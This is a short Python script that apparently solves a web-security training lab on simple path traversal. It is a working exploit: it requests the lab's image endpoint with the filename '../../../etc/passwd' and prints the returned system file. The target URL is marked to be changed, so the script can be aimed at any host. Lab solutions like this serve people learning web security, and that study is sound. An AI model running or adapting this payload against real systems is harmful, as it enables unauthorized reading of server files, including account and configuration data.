#Vulnerability :- Path Traveral
#Lab Name :- File path traversal, simple case

import requests

url = "https://0af800b10433818a80e4857900e5000e.web-security-academy.net" # Change Me Without Trailing Slashes
def i_am_attacking():
    payload = "../../../etc/passwd"
    url_with_payload = f"{url}/image?filename={payload}"
    r = requests.get(url_with_payload)
    print()
    print(r.text)        
i_am_attacking()